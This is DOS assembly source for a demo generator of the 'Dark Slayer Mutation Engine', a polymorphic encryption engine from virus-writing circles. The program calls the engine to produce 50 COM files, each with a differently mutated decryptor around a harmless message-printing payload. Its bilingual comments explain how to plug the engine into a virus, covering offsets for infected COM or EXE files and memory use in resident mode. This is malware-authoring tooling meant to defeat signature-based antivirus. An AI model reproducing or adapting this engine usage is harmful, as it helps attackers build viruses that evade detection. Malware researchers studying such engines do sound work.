
; Dark Slayer Mutation Engine v1.0
;     Written by Dark Slayer in Taiwan

DSME_GEN SEGMENT
         ASSUME  CS:DSME_GEN,DS:DSME_GEN
         ORG     0100h

MSG_ADDR EQU     OFFSET MSG-OFFSET PROC_START-0005h

         EXTRN   DSME:NEAR,DSME_END:NEAR

                      ; 以下程式，除了要注意的地方有注解，其它部份自己研究
                      ; you may get some information as following remarks
                      ;

START:
         MOV     AH,09h
         MOV     DX,OFFSET DG_MSG
         INT     21h

         MOV     AX,OFFSET DSME_END+000Fh ; 本程式 + DSME+000Fh 之後的位址
                                   ; 若減 0100h 則成為本程式 + DSME 的長度
                                   ; This program + DSME+000Fh address
                                   ; Minus 0100h = this program + DSME
                                   ; lengh
         MOV     CL,04h
         SHR     AX,CL
         MOV     BX,CS
         ADD     BX,AX

         MOV     ES,BX                   ; 設 ES 用來放解碼程式和被編碼資料
                                                ; 解碼程式最大為 1024 Bytes
                                ; 若用在常駐程式時，則須注意分配的記憶體大小
                                ; Setting ES to put decryptor and encrypted
                                ; code.
                                ; Decryptor maxium is 1024 bytes
                                ; You should notice the allocation of memory
                                ; size when you use DSME in resident mode.


         MOV     CX,50
DG_L0:
         PUSH    CX
         MOV     AH,3Ch
         XOR     CX,CX
         MOV     DX,OFFSET FILE_NAME
         INT     21h
         XCHG    BX,AX

         MOV     BP,0100h                                ; 解碼程式偏移位址
                                       ; 用來寫毒時則依欲感染檔案之大小而設
                                       ; Offset where the decryption routine
                                       ; will be executed
                                       ; It depends on which kinds of files
                                       ; COM or EXE?

         MOV     CX,OFFSET PROC_END-OFFSET PROC_START    ; 被編碼程式的長度
                                                         ; encrypted code
                                                         ; lengh

         MOV     DX,OFFSET PROC_START         ; DS:DX -> 要被編碼的程式位址
                                              ; DS:DX -> Encrypted code's
                                              ;          address

         PUSH    BX                                      ; 保存 File handle
                                                         ; keep File handle

         MOV     BL,00h                                          ; COM 模式
                                                                 ; COM mode

         CALL    DSME

         POP     BX

         MOV     AH,40h        ; 返回時 DS:DX = 解碼程式 + 被編碼程式的位址
         INT     21h     ; CX = 解碼程式 + 被編碼程式的長度，其它暫存器不變
                         ;  When returning from DSME,
                         ;  DS:DX = decryptor + encrypted code's address
                         ;  CX = lengh of decryptor + encrypted code
                         ; Other registers won't be changed.

         MOV     AH,3Eh
         INT     21h

         PUSH    CS
         POP     DS                                          ; 將 DS 設回來
                                                             ; restore DS

         MOV     BX,OFFSET FILE_NUM
         INC     BYTE PTR DS:[BX+0001h]
         CMP     BYTE PTR DS:[BX+0001h],'9'
         JBE     DG_L1
         INC     BYTE PTR DS:[BX]
         MOV     BYTE PTR DS:[BX+0001h],'0'
DG_L1:
         POP     CX
         LOOP    DG_L0
         MOV     AH,4Ch
         INT     21h

FILE_NAME DB     '000000'
FILE_NUM DB      '00.COM',00h

DG_MSG   DB      'Generates 50 DSME encrypted test files.',0Dh,0Ah,'$'

PROC_START:
         MOV     AH,09h
         CALL    $+0003h
         POP     DX
         ADD     DX,MSG_ADDR
         INT     21h
         INT     20h
MSG      DB      'this is <DSME> test file.$'
PROC_END:

DSME_GEN ENDS
         END     START
